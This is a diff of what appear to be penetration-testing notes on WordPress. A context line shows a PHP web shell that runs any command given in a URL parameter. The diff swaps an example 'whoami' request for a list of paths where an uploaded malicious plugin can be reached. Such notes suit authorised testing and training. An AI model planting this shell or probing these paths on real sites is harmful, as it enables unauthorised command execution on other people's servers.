@@ -22,6 +22,11 @@ echo system($_GET[cmd]);
 ?>
 ```
 
+### Uploaded Plugin Locations
+
 ```
-http://<ip-address>/wordpress/wp-content/plugins/plugin.php?cmd=whoami
+/wp-admin/plugins.php
+/wordpress/wp-content/plugins/plugin.php
+/wp-content/plugins/plugin.php
+/wp-content/uploads/plugin.php
 ```
